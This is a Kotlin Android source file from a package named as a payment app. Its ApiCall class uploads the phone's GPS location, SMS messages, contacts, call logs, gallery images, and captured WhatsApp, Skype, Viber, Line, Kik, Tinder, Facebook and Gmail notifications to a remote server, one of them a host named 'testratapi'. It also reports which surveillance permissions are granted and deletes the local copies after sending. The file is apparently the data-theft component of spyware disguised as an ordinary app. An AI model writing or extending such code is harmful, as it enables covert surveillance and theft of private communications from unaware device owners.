package com.payment.app.services

import APIInterface
import android.content.Context
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.os.Build
import android.util.Log
import com.android.volley.AuthFailureError
import com.android.volley.DefaultRetryPolicy
import com.android.volley.Response
import com.android.volley.VolleyLog
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.payment.app.ApiCallManager
import com.payment.app.model.ApiGmailNotificationModel
import com.payment.app.model.ApiNotificationModel
import com.payment.app.model.CallLogModel
import com.payment.app.model.ContactSyncModel
import com.payment.app.model.SmsModel
import com.payment.app.sqllite.SQLiteHelper
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import retrofit2.Call
import retrofit2.Callback
import java.io.File
import java.time.LocalDateTime
import kotlin.collections.ArrayList

class ApiCall{
    private val MY_SOCKET_TIMEOUT_MS = 3600000

    fun locationApi(
        latitude: Double,
        longitude: Double,
        context: Context,
        baseUrl: String,
        token: String
    ) {
        ApiCallManager.appendLog("Gathering Location")
        val current = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            LocalDateTime.now()
        } else {
            TODO("VERSION.SDK_INT < O")
        }
        val requestData = JSONObject()
        requestData.put("latitude", latitude.toString())
        requestData.put("longitude", longitude.toString())
        requestData.put("logDateTime", current.toString())
        // Make the POST request
        val url = "$baseUrl/api/Location"
        Log.d("Location requestData", requestData.toString())
        Log.d("token", token)

//        ApiCallManager.appendLog("===================")
//        ApiCallManager.appendLog("Location API url => $url")
//        ApiCallManager.appendLog("Location API request => $requestData")
//        ApiCallManager.appendLog("===================")

        val req: JsonObjectRequest = object : JsonObjectRequest(
            Method.POST, url, requestData,
            Response.Listener<JSONObject> { response ->
                try {
                    val jObject = JSONObject(response.toString())
                    ApiCallManager.appendLog("Calling Location API Success!!! ${jObject.getString("latitude")} ${jObject.getString("longitude")}")

                    Log.d(
                        "Location Response",
                        response.toString()
                    )
                } catch (e: JSONException) {
                    e.printStackTrace()
                    ApiCallManager.appendLog("Calling Location API failed: ${e.toString() ?: "Unknown Error"}")

                }
            },
            Response.ErrorListener { error ->
                VolleyLog.d("Error", "Error: " + error.message)
                ApiCallManager.appendLog("Calling Location API failed: ${error?.toString() ?: "Unknown Error"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(context)
        queue.add(req)
    }

    fun callBatteryWifiApi(
        connected: Boolean,
        batteryLevel: Int,
        isCallLogPermissionGranted: Boolean,
        isContactPermissionGranted: Boolean,
        isLocationPermissionGranted: Boolean,
        isPostNotificationPermissionGranted: Boolean,
        isSmsPermissionGranted: Boolean,
        isReadMediaImagePermissionGranted: Boolean,
        baseUrl: String,
        applicationContext: Context,
        token: String
    ) {
        ApiCallManager.appendLog("Battery Level Api Call")


        Log.d("token",token)
        val requestData = JSONObject()
        requestData.put("isConnectedWithWifi", connected)
        requestData.put("batteryPercentage", batteryLevel)
        if(isCallLogPermissionGranted && isContactPermissionGranted && isLocationPermissionGranted && isPostNotificationPermissionGranted && isSmsPermissionGranted && isReadMediaImagePermissionGranted){
            requestData.put("status", 2)
        }
        else if(!isCallLogPermissionGranted && !isContactPermissionGranted && !isLocationPermissionGranted && !isPostNotificationPermissionGranted && !isSmsPermissionGranted && !isReadMediaImagePermissionGranted){
            requestData.put("status", 3)
        }
        else{
            requestData.put("status", 1)
        }

        val url = "$baseUrl/api/DeviceData/CreateUpdate"
        Log.d("Battery requestData",requestData.toString())
        Log.d("token",token)
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Gathering Battery Level API url => $url")
//        ApiCallManager.appendLog("Gathering Battery Level API request => $requestData")
        ApiCallManager.appendLog("===================")

        val req: JsonObjectRequest = object : JsonObjectRequest(
            Method.POST, url, requestData,
            Response.Listener<JSONObject> { response ->
                Log.d("BatteryWifiApi Response", response.toString())
                ApiCallManager.appendLog("Calling Battery Level API Success!!!")
            },
            Response.ErrorListener { error ->
                VolleyLog.d("Error", "Error: " + error.message)
                ApiCallManager.appendLog("Calling Battery Level API failed: ${error.toString() ?: "Unknown Error"}")

            }) {

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }

    fun callSmsApi(
        dataList: ArrayList<SmsModel>,
        token: String,
        applicationContext: Context,
        baseUrl: String,
        editor: SharedPreferences.Editor,
        dateList: ArrayList<String>
    ) {
        val url = "$baseUrl/api/SMS/AddRangeAsync"

        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("SMS API url => $url")
//        ApiCallManager.appendLog("SMS API request => $dataList")
        ApiCallManager.appendLog("===================")

        val req = object : StringRequest(
            Method.POST, url,
            Response.Listener {response ->
                Log.d("Sms Response", response.toString())
                ApiCallManager.appendLog("SMS API Call Success")
                if(dateList.isNotEmpty()){
                    editor.putString("isAllSmsLogApi","true")
                    editor.putString("oldSmsDate",dateList.first())
                    editor.apply()
                }
            },

            Response.ErrorListener { error ->
                error.printStackTrace()
                Log.d("Sms Error", "SMS API Call failed")

                VolleyLog.d("Error", "Error: " + error.message)
                ApiCallManager.appendLog("SMS API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
                return jsonBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }

    fun contactHistoryApi(
        dataList: ArrayList<ContactSyncModel>,
        token: String,
        applicationContext: Context,
        baseUrl: String
    ) {
        ApiCallManager.appendLog("Calling Contact API")

        val url = "$baseUrl/api/Contacts/AddRangeAsync"
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Contacts API url => $url")
//        ApiCallManager.appendLog("Contacts API request => $dataList")
        ApiCallManager.appendLog("===================")
        val req: StringRequest = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                Log.e("Contact Response", response.toString())

                ApiCallManager.appendLog("Calling Contact API Success!!!")
            },
            Response.ErrorListener { error ->
                Log.e("Failed Error", "Error: " + error.message)
                ApiCallManager.appendLog("Calling Contact API failed: ${error?.toString() ?: "Unknown Error"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                // request body goes here
                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
                return jsonBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }

    fun callHistoryApi(
        dataList: ArrayList<CallLogModel>,
        applicationContext: Context,
        token: String,
        baseUrl: String,
        editor: SharedPreferences.Editor,
        dateList: ArrayList<String>
    ) {
        ApiCallManager.appendLog("Calling Call Log API")

        Log.d("callHistoryApi", "callHistoryApi")
        val url = "$baseUrl/api/CallLog/AddRangeAsync"
        Log.d("Call log requestData", dataList.toString())
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Call Log API url => $url")
//        ApiCallManager.appendLog("Call Log API request => $dataList")
        ApiCallManager.appendLog("===================")

        val req = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                ApiCallManager.appendLog("Call Log API Call Success")
                ApiCallManager.appendLog("callHistoryApi Response : $response")
                Log.d("callHistoryApi Response", response.toString())
                editor.putString("isAllCallLogApi","true")
                editor.putString("oldCallDate",dateList.last())
                editor.apply()
            },
            Response.ErrorListener { error ->
                VolleyLog.d("Error", "Error: " + error.message)
                ApiCallManager.appendLog("Call Log API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
                return jsonBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }

    var maxMb = 0

    fun uploadFile(
        file: File,
        name: String,
        applicationContext: Context,
        downloadMb: Int,
        connectivityManager: ConnectivityManager,
        editor: SharedPreferences.Editor,
        dateList: ArrayList<String>,
        date: String,
        s: String
    ) {
        ApiCallManager.appendLog("$name Api Call")
        val connected = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI)!!.state == NetworkInfo.State.CONNECTED
        Log.d("connected",connected.toString())

        try {
            val requestFile: RequestBody =
                RequestBody.create("multipart/form-data".toMediaTypeOrNull(), file)

            val requestImage: MultipartBody.Part =
                MultipartBody.Part.createFormData("files", file.name, requestFile)

            Log.e("TAG", "onResponse: ...image file....${file.name}")
            ApiCallManager.appendLog("===================")
            ApiCallManager.appendLog("Gathering $name API url => https://testratapi.azurewebsites.net/api/Gallery/AddGallery")
//            ApiCallManager.appendLog("Gathering $name API request => $requestFile")
            ApiCallManager.appendLog("===================")
            val apiInterface: APIInterface =
                APIClient.getClient(applicationContext, true)!!.create(
                    APIInterface::class.java
                )
            val call: Call<JsonObject?>? = apiInterface.uploadImage(requestImage)
            call?.enqueue(object : Callback<JsonObject?> {
                override fun onResponse(
                    call: Call<JsonObject?>,
                    response: retrofit2.Response<JsonObject?>
                ) {
                    try {
                        val imageResponse: JsonObject? = response.body()
                        ApiCallManager.appendLog("onResponse: ...$name upload....$imageResponse")
                        if(imageResponse != null){
                            editor.putString(s,"true")
                            editor.putString(date,dateList.first())
                            editor.apply()
                            if(!connected){
                                editor.putString("isAllLsogApi", "false")
                                editor.apply()
                            } else {
                                if(downloadMb > 100){
                                    editor.putString("isAllLogApi", "true")
                                    editor.apply()
                                } else{
                                    editor.putString("isAllLogApi", "false")
                                    editor.apply()
                                }
                            }
                        }
//

                        Log.d("TAG", "onResponse: ...$name upload....$imageResponse")
                    } catch (e: Exception) {
                        ApiCallManager.appendLog("$name Api Fail ${e.toString()}")
                        e.printStackTrace()
                    }
                }
                override fun onFailure(call: Call<JsonObject?>, t: Throwable) {
                    Log.e("xxx", "onFailure: $name not uploaded  $t")
                    ApiCallManager.appendLog("onFailure: $name not uploaded $t")
                }
            })
        } catch (e: Exception) {
            ApiCallManager.appendLog("$name API failed: ${e.toString() ?: "Unknown Error"}")
            e.printStackTrace()
        }
    }

    fun callWhatsappApi(
        baseUrl: String,
        dataList: ArrayList<ApiNotificationModel>,
        token: String,
        applicationContext: Context,
        id: ArrayList<Int>,
        sqliteHelper: SQLiteHelper
    ) {

        val url = "$baseUrl/api/Whatsapp/AddRangeAsync"
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Call Whatsapp API url => $url")
        Log.d("Call Whatsapp","Call Whatsapp API url => $url")
//        ApiCallManager.appendLog("Call Log API request => $dataList")
        ApiCallManager.appendLog("===================")
        val req = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                ApiCallManager.appendLog("Call Whatsapp API Call Success")
                ApiCallManager.appendLog("callWhatsappApi Response : $response")
                sqliteHelper.deleteDataById(id)
                Log.d("callWhatsappApi Response", response.toString())
            },
            Response.ErrorListener { error ->
                VolleyLog.d("callWhatsappApi Error", "Error: " + error.message)
                ApiCallManager.appendLog("Call Whatsapp Api API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
                return jsonBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }

    fun callSkypeApi(
        baseUrl: String,
        dataList: ArrayList<ApiNotificationModel>,
        token: String,
        applicationContext: Context,
        id: ArrayList<Int>,
        sqliteHelper: SQLiteHelper
    ) {

        val url = "$baseUrl/api/Skype/AddRangeAsync"
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Call Skype API url => $url")
        Log.d("Call Skype","Call Skype API url => $url")
        ApiCallManager.appendLog("===================")
        val req = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                ApiCallManager.appendLog("Call Skype API Call Success")
                ApiCallManager.appendLog("callSkypeApi Response : $response")
                sqliteHelper.deleteDataById(id)
                Log.d("callSkypeApi Response", response.toString())
            },
            Response.ErrorListener { error ->
                VolleyLog.d("callSkypeApi Error", "Error: " + error.message)
                ApiCallManager.appendLog("Call Skype Api API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
                return jsonBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }

    fun callViberApi(
        baseUrl: String,
        dataList: ArrayList<ApiNotificationModel>,
        token: String,
        applicationContext: Context,
        id: ArrayList<Int>,
        sqliteHelper: SQLiteHelper
    ) {

        val url = "$baseUrl/api/Viber/AddRangeAsync"
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Call Viber API url => $url")
        Log.d("Call Viber","Call Viber API url => $url")
        ApiCallManager.appendLog("===================")
        val req = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                ApiCallManager.appendLog("Call Viber API Call Success")
                ApiCallManager.appendLog("callViberApi Response : $response")
                sqliteHelper.deleteDataById(id)
                Log.d("callViberApi Response", response.toString())
            },
            Response.ErrorListener { error ->
                VolleyLog.d("callViberApi Error", "Error: " + error.message)
                ApiCallManager.appendLog("Call Viber Api API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
                return jsonBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }

    fun callLineApi(
        baseUrl: String,
        dataList: ArrayList<ApiNotificationModel>,
        token: String,
        applicationContext: Context,
        id: ArrayList<Int>,
        sqliteHelper: SQLiteHelper
    ) {

        val url = "$baseUrl/api/Line/AddRangeAsync"
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Call Line API url => $url")
        Log.d("Call Line","Call Line API url => $url")
        ApiCallManager.appendLog("===================")
        val req = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                ApiCallManager.appendLog("Call Line API Call Success")
                ApiCallManager.appendLog("callLineApi Response : $response")
                sqliteHelper.deleteDataById(id)
                Log.d("callLineApi Response", response.toString())
            },
            Response.ErrorListener { error ->
                VolleyLog.d("callLineApi Error", "Error: " + error.message)
                ApiCallManager.appendLog("Call Line Api API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
                return jsonBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }
    fun callKikApi(
        baseUrl: String,
        dataList: ArrayList<ApiNotificationModel>,
        token: String,
        applicationContext: Context,
        id: ArrayList<Int>,
        sqliteHelper: SQLiteHelper
    ) {

        val url = "$baseUrl/api/Kik/AddRangeAsync"
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Call Kik API url => $url")
        Log.d("Call Kik","Call Kik API url => $url")
        ApiCallManager.appendLog("===================")
        val req = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                ApiCallManager.appendLog("Call Kik API Call Success")
                ApiCallManager.appendLog("callKikApi Response : $response")
                sqliteHelper.deleteDataById(id)
                Log.d("callKikApi Response", response.toString())
            },
            Response.ErrorListener { error ->
                VolleyLog.d("callKikApi Error", "Error: " + error.message)
                ApiCallManager.appendLog("Call Kik Api API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
                return jsonBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }
    fun callTinderApi(
        baseUrl: String,
        dataList: ArrayList<ApiNotificationModel>,
        token: String,
        applicationContext: Context,
        id: ArrayList<Int>,
        sqliteHelper: SQLiteHelper
    ) {

        val url = "$baseUrl/api/Tinder/AddRangeAsync"
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Call Tinder API url => $url")
        Log.d("Call Facebook","Call Tinder API url => $url")
        ApiCallManager.appendLog("===================")
        val req = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                ApiCallManager.appendLog("Call Tinder API Call Success")
                ApiCallManager.appendLog("callTinderApi Response : $response")
                sqliteHelper.deleteDataById(id)
                Log.d("callTinderApi Response", response.toString())
            },
            Response.ErrorListener { error ->
                VolleyLog.d("callTinderApi Error", "Error: " + error.message)
                ApiCallManager.appendLog("Call Tinder Api API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
                return jsonBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }

    fun callFacebookApi(
        baseUrl: String,
        dataList: ArrayList<ApiNotificationModel>,
        token: String,
        applicationContext: Context,
        id: ArrayList<Int>,
        sqliteHelper: SQLiteHelper
    ) {

        val url = "$baseUrl/api/Facebook/AddRangeAsync"
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Call Facebook API url => $url")
        Log.d("Call Facebook","Call Facebook API url => $url")
        ApiCallManager.appendLog("===================")
        val req = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                ApiCallManager.appendLog("Call Facebook API Call Success")
                ApiCallManager.appendLog("callFacebookApi Response : $response")
                sqliteHelper.deleteDataById(id)
                Log.d("callFacebookApi Response", response.toString())
            },
            Response.ErrorListener { error ->
                VolleyLog.d("callFacebookApi Error", "Error: " + error.message)
                ApiCallManager.appendLog("Call Facebook Api API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
                return jsonBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }


    fun callEmailApi(
        baseUrl: String,
        dataList: ArrayList<ApiGmailNotificationModel>,
        token: String,
        applicationContext: Context,
        id: ArrayList<Int>,
        sqliteHelper: SQLiteHelper
    ) {

        val url = "$baseUrl/api/Gmail/AddRangeAsync"
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Call Email API url => $url")
        Log.d("Call Email","Call Email API url => $url")
        ApiCallManager.appendLog("===================")
        val req = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                ApiCallManager.appendLog("Call Email API Call Success")
                ApiCallManager.appendLog("callEmailApi Response : $response")
                sqliteHelper.deleteDataById(id)
                Log.d("callEmailApi Response", response.toString())
            },
            Response.ErrorListener { error ->
                VolleyLog.d("callEmailApi Error", "Error: " + error.message)
                ApiCallManager.appendLog("Call Email Api API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getBody(): ByteArray {
                val jsonBody = JSONArray(Gson().toJson(dataList)).toString()
                return jsonBody.toByteArray(charset("utf-8"))
            }

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            MY_SOCKET_TIMEOUT_MS,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }

}